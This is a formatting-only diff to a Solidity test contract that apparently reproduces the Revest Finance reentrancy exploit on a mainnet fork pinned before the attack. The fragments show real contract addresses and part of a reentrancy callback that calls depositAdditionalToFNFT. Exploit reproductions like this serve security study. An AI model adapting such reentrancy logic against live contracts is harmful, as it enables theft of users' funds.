@@ -155,7 +155,8 @@ interface IRevest {
 contract Exploit_RevestFinance is TestHarness {
     IUniswapV2Pair internal renaWethPair = IUniswapV2Pair(0xbC2C5392b0B841832bEC8b9C30747BADdA7b70ca);
 
-    IERC1820Registry internal interfaceRegistry = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
+    IERC1820Registry internal interfaceRegistry =
+        IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
     IRevest internal revest = IRevest(0x2320A28f52334d62622cc2EaFa15DE55F9987eD9);
     IERC20 internal rena = IERC20(0x56de8BC61346321D4F2211e3aC3c0A7F00dB9b76);
 
@@ -165,8 +166,8 @@ contract Exploit_RevestFinance is TestHarness {
     uint256 currentId;
 
     function setUp() external {
-        cheat.createSelectFork(vm.envString("RPC_URL"), 14465356); // We pin one block before the exploit
-            // happened.
+        cheat.createSelectFork(vm.envString("RPC_URL"), 14_465_356); // We pin one block before the exploit
+        // happened.
 
         cheat.label(attacker, "Attacker");
     }
@@ -230,7 +231,7 @@ contract Exploit_RevestFinance is TestHarness {
         // Checking that the current minted ID is the next one to ensure that we mint all the NFTs of that ID
         if (id == currentId + 1 && (reentrancyStep == 0)) {
             // Using a reentrancyStep as a number allows us to perform different logics depending on the
-                // current callback step.
+            // current callback step.
             reentrancyStep++;
             revest.depositAdditionalToFNFT(currentId, 1e18, 1);
         }
